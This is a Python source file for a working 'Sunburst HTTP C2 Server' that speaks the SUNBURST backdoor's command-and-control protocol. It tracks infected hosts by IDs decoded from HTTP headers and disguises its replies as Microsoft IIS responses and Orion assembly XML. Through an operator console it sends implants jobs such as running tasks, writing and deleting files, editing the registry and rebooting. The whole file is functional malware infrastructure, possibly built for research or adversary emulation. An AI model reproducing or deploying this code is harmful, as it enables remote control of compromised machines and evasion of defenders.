#!/usr/bin/env python3
import binascii
from argparse import ArgumentParser

import zlib
from enum import IntEnum
import logging
from random import seed, choice
import sys
import os
import cmd
import datetime
from tabulate import tabulate
import re
from socketserver import ThreadingMixIn
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import random

seed()


class LogFormatter(logging.Formatter):
    FORMATS = {
        logging.ERROR: "(%(asctime)s) [!] %(msg)s",
        logging.INFO: "(%(asctime)s) [*] %(msg)s",
        logging.WARNING: "WARNING: %(msg)s",
        logging.DEBUG: "DBG: %(module)s: %(lineno)d: %(msg)s",
        "DEFAULT": "%(asctime)s - %(msg)s"
    }

    def format(self, record):
        format_orig = self._style._fmt
        self._style._fmt = self.FORMATS.get(record.levelno, self.FORMATS['DEFAULT'])
        result = logging.Formatter.format(self, record)
        self._style._fmt = format_orig
        return result


log = logging.getLogger("sunburst_httpc2")
log.setLevel(logging.DEBUG)
log_ch = logging.StreamHandler()
log_ch.setLevel(logging.INFO)
log_ch.setFormatter(LogFormatter(datefmt="%H:%M:%S"))
log.addHandler(log_ch)


class CryptoHelper:

    @staticmethod
    def compress(data, compresslevel=9):
        compress = zlib.compressobj(
            compresslevel,  # level: 0-9
            zlib.DEFLATED,  # method: must be DEFLATED
            -zlib.MAX_WBITS,  # window size in bits:
            #   -15..-8: negate, suppress header
            #   8..15: normal
            #   16..30: subtract 16, gzip header
            zlib.DEF_MEM_LEVEL,  # mem level: 1..8/9
            0  # strategy:
            #   0 = Z_DEFAULT_STRATEGY
            #   1 = Z_FILTERED
            #   2 = Z_HUFFMAN_ONLY
            #   3 = Z_RLE
            #   4 = Z_FIXED
        )
        deflated = compress.compress(data)
        deflated += compress.flush()
        return deflated

    @staticmethod
    def decompress(data):
        decompress = zlib.decompressobj(
            -zlib.MAX_WBITS  # see above
        )
        inflated = decompress.decompress(data)
        inflated += decompress.flush()
        return inflated

    @staticmethod
    def inflate(data):
        array = bytearray(CryptoHelper.compress(data))
        array2 = [sum(array) % 256]
        for i in range(len(array)):
            array[i] ^= array2[0]
        array2 += array
        return array2

    @staticmethod
    def to_hex(data):
        return "".join("0x{:02x}".format(b)[2:] for b in data)

    @staticmethod
    def to_guid(data):
        hex_data = CryptoHelper.to_hex(data)
        guid = "{" + hex_data[0:8] + "-" + hex_data[8:12] + "-" + hex_data[12:16] + "-" + hex_data[
                                                                                          16:20] + "-" + hex_data[
                                                                                                         20:32] + "}"
        return guid

    @staticmethod
    def encode_data_xml(data):
        ASSESMBLY_NAMES = [
            "Microsoft.Threading.Tasks.Desktop",
            "System.Runtime.Serialization.Primitives",
            "System.Runtime.Serialization.Xml",
            "System.Security.Claims",
            "System.Security.Cryptography.Algorithms"
        ]

        ASSESMBLY_VERSIONS = [
            "1.0.160.0",
            "1.0.161.0",
            "1.0.162.0",
            "1.0.163.0",
            "1.0.164.0",
            "1.0.165.0",
            "1.0.166.0",
            "1.0.167.0",
            "1.0.168.0",
            "1.0.169.0",
        ]

        encoded_data = ""
        xml_template = '<?xml version="1.0" encoding="utf-8"?>\n<assembly Name="Orion.UI" Key="{0}" Version="4.8">\n<dependencies>\n{1}\n</dependencies>\n</assembly>'
        line_template = '<assemblyIdentity Name="{3}" Key="{0}" Version="{4}" Culture="neutral" PublicKeyToken="{1}" Hash="{2}"/>'
        lines = []
        if len(data) <= 16:
            data += [1]*(16-len(data))
            encoded_data = xml_template.format(CryptoHelper.to_guid(data), "")
        else:
            first_data = data[:16]
            rest_data = data[16:]
            line_data_size = 16+8+16
            if len(rest_data) < line_data_size:
                rest_data += [1]*(line_data_size-len(rest_data))
            for i in range(len(rest_data)//line_data_size):
                guid = CryptoHelper.to_guid(rest_data[i*line_data_size+0:i*line_data_size+16])
                keytoken = CryptoHelper.to_hex(rest_data[i*line_data_size+16:i*line_data_size+16+8])
                hashvalue = CryptoHelper.to_hex(rest_data[i*line_data_size+24:i*line_data_size+24+16])
                assembly_name = choice(ASSESMBLY_NAMES)
                assembly_version = choice(ASSESMBLY_VERSIONS)
                line = line_template.format(guid, keytoken, hashvalue, assembly_name, assembly_version)
                lines.append(line)
            encoded_data = xml_template.format(CryptoHelper.to_guid(data), "".join(lines))
        return encoded_data

    @staticmethod
    def decode_if_none_header(data):
        data_len = len(data)
        array1_hex = data[:data_len//2]
        array2_hex = data[data_len//2:]
        array1 = bytearray(binascii.unhexlify(array1_hex))
        array2 = bytearray(binascii.unhexlify(array2_hex))
        for i in range(len(array1)):
            array1[i] ^= array2[2 + i % 4]
        user_id = binascii.hexlify(array1)
        return user_id


class Sunbeam:
    class Job:
        class Type(IntEnum):
            Idle = 0
            Exit = 1
            SetTime = 2
            CollectSystemDescription = 3
            UploadSystemDescription = 4
            RunTask = 5
            GetProcessByDescription = 6
            KillTask = 7
            GetFileSystemEntries = 8
            WriteFile = 9
            FileExists = 10
            DeleteFile = 11
            GetFileHash = 12
            ReadRegistryValue = 13
            SetRegistryValue= 14
            DeleteRegistryValue = 15
            GetRegistrySubKeyAndValueNames = 16
            Reboot = 17
            NONE = 18

        def __init__(self, type, parameters):
            self.type = type
            self.parameters = parameters

    def __init__(self, userid):
        self.userid = userid
        self.first_seen = datetime.datetime.now()
        self.last_seen = self.first_seen
        self.jobs = []

    def update_seen(self):
        self.last_seen = datetime.datetime.now()

    def __str__(self):
        return "id= {}, first seen= {}, last_seen= {}".format(self.userid.decode(), self.first_seen, self.last_seen)


class C2HTTPHandler(BaseHTTPRequestHandler):

    ENCODING_SCHEME_XML = 1
    ENCODING_SCHEME_SKIP_12 = 2
    ENCODING_SCHEME_SKIP_48 = 3

    def log_message(self, format, *args):
        return

    def do_POST(self):
        if self.is_encoded_request:
            return self.handle_encoded_request()
        else:
            return self.handle_raw_request()

    def do_PUT(self):
        if self.is_encoded_request:
            return self.handle_encoded_request()
        else:
            return self.handle_raw_request()

    def do_HEAD(self):
        return self.handle_initial_request()

    def do_GET(self):
        return self.handle_initial_request()

    @property
    def is_encoded_request(self):
        encoded_request = False
        try:
            content_type = self.headers.get_content_type()
            encoded_request = (content_type == "application/json")
        except:
            pass
        return encoded_request

    def handle_encoded_request(self):
        request_body = None
        try:
            content_len = int(self.headers.get('Content-Length'))
            request_body = self.rfile.read(content_len)
        except:
            return
        self.send_response(200)
        self.end_headers()
        message = ""
        self.wfile.write(message.encode())
        return

    def handle_raw_request(self):
        request_body = None
        try:
            content_len = int(self.headers.get('Content-Length'))
            request_body = self.rfile.read(content_len)
        except:
            return
        self.send_response(200)
        self.end_headers()
        message = ""
        self.wfile.write(message.encode())
        return

    def handle_initial_request(self):
        message = ""
        encoding_scheme = None
        if self.path.startswith("/pki"):
            encoding_scheme = self.ENCODING_SCHEME_SKIP_12
        elif self.path.startswith("/fonts"):
            encoding_scheme = self.ENCODING_SCHEME_SKIP_48
        elif self.path.startswith("/swip"):
            encoding_scheme = self.ENCODING_SCHEME_XML
        encoded_userid = self.headers.get('If-None-Match')
        if encoded_userid is None or encoding_scheme is None:
            self.send_response(200)
            self.end_headers()
            return

        sunbeam_userid = CryptoHelper.decode_if_none_header(encoded_userid)
        if sunbeam_userid in self.server.sunbeams:
            sunbeam = self.server.sunbeams[sunbeam_userid]
            sunbeam.update_seen()
        else:
            sunbeam = Sunbeam(sunbeam_userid)
            log.info("New sunbeam found: {}".format(sunbeam_userid))
            sunbeam.jobs += self.server.auto_execute_jobs
            self.server.sunbeams[sunbeam_userid] = sunbeam
        if len(sunbeam.jobs) == 0:
            # default job. This job will keep the backdoor channel alive
            job = Sunbeam.Job(Sunbeam.Job.Type.SetTime, "1")
            sunbeam.jobs.append(job)
        job = sunbeam.jobs[0]
        sunbeam.jobs = sunbeam.jobs[1:]
        data = "{} {}".format(job.type, job.parameters)
        data_inflated = CryptoHelper.inflate(data.encode())
        message_size_dword = [len(data_inflated) >> i & 0xff for i in (0, 8, 16, 24)]
        data_bytes = []
        data_bytes += message_size_dword
        data_bytes += data_inflated
        content_type = "application/octet-stream"
        if encoding_scheme == self.ENCODING_SCHEME_XML:
            message = CryptoHelper.encode_data_xml(data_bytes).encode()
            content_type = "application/xml"
        elif encoding_scheme == self.ENCODING_SCHEME_SKIP_12:
            message = bytes([random.randint(0, 255) for i in range(12)] + data_bytes)
        elif encoding_scheme == self.ENCODING_SCHEME_SKIP_48:
            message = bytes([random.randint(0, 255) for i in range(48)] + data_bytes)
        headers = "HTTP/1.1 200 OK\r\n" \
                  "Content-Type: {}\r\n" \
                  "Server: Microsoft-IIS/10.0\r\n" \
                  "\r\n"
        headers = headers.format(content_type)
        self.wfile.write((headers.encode() + message))


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    def __init__(self, server_address):
        self.sunbeams = dict()
        self.auto_execute_jobs = []
        HTTPServer.__init__(self, server_address, C2HTTPHandler)


class MainMenu(cmd.Cmd):
    banner = r"""
                    ___                          __    /\      __    __                ________  
  ________ __  ____ \_ |__  __ _________  ______/  |_ |  |__ _/  |__/  |_______   ____ \_____  \ 
 /  ___/  |  \/    \ | __ \|  |  \_  __ \/  ___/   __\|  |  \\   __\   __\____ \_/ ___\ /  ____/ 
 \___ \|  |  /   |  \| \_\ \  |  /|  | \/\___ \ |  |  |      \|  |  |  | |  |_\ \  \___/       \ 
/____  \____/|___|  /|___  /____/ |__|  /____  \|__|  |___|  /|__|  |__| |   ___/\___  /_______ \
     \/           \/     \/                  \/            \/            |__|        \/        \/
    """
    intro = banner + "\n" + 'Welcome to the Sunburst HTTP C2 Server.\nType help or ? to list commands.\n'
    prompt = '(sunburst) '
    file = None

    def __init__(self, c2server):
        super(MainMenu, self).__init__()
        self.c2server = c2server

    def do_exit(self, s):
        return True

    def help_exit(self):
        print("Exit the interpreter.")
        print("You can also use the Ctrl-D shortcut.")

    do_EOF = do_exit
    help_EOF = help_exit

    def do_list(self, arg):
        print("Sunbeams:")
        if self.c2server.sunbeams:
            table_values = [re.findall(r'=\s*([^,]*),?', str(self.c2server.sunbeams[key])) for key in self.c2server.sunbeams]
            table_headers = re.findall(r'\s*([^=,]*)=\s*[^,]*,?', str(list(self.c2server.sunbeams.values())[0]))
            table = tabulate(table_values, headers=table_headers)
            print(table)

    def do_auto_execute(self, arg):
        args = arg.split(" ")
        if len(args) < 2:
            log.error("Invalid argument. Expected arguments: job_id job_parameters")
            return
        try:
            job_type = int(args[0].strip())
        except:
            log.error("Invalid argument. Expected arguments: job_id job_parameters")
            return
        parameters = " ".join(args[1:])
        job_type = Sunbeam.Job.Type(job_type)
        job = Sunbeam.Job(job_type, parameters)
        self.c2server.auto_execute_jobs.append(job)
        print("\tSunbeam will process the next auto execute job in the queue on its next HTTP response")

    def do_execute(self, arg):
        args = arg.split(" ")
        if len(args) < 2:
            log.error("Invalid argument. Expected arguments: id job_id job_parameters")
            return
        userid = args[0].strip().encode()
        try:
            job_type = int(args[1].strip())
        except:
            log.error("Invalid argument. Expected arguments: id job_id job_parameters")
            return
        parameters = " ".join(args[2:])
        sunbeam = self.c2server.sunbeams.get(userid, None)
        if sunbeam is None:
            for key in self.c2server.sunbeams:
                if key.startswith(userid):
                    userid = key
                    sunbeam = self.c2server.sunbeams[userid]
                    break
            else:
                log.error("Sunbeam does not exist")
                return
        job_type = Sunbeam.Job.Type(job_type)
        job = Sunbeam.Job(job_type, parameters)
        sunbeam.jobs.append(job)
        print("\tSunbeam will receive the job on its next HTTP response")


if __name__ == '__main__':
    parser = ArgumentParser(usage=sys.argv[0] + " [options]:\n",
                            description="Sunburst HTTP C2")
    parser.add_argument("-p", "--port", metavar="80", default="80", help='Port number to listen for HTTP backdoor requests.')

    options = parser.parse_args()

    try:
        ip = "0.0.0.0"
        server = ThreadedHTTPServer((ip, int(options.port)))
        server_thread = threading.Thread(target=server.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        menu = MainMenu(server)
        menu.cmdloop()
    except (KeyboardInterrupt, SystemExit):
        server.shutdown()
        log.info(sys.argv[0] + " is shutting down.")
        sys.exit()
    except Exception as e:
        log.error(f"{repr(e)}")
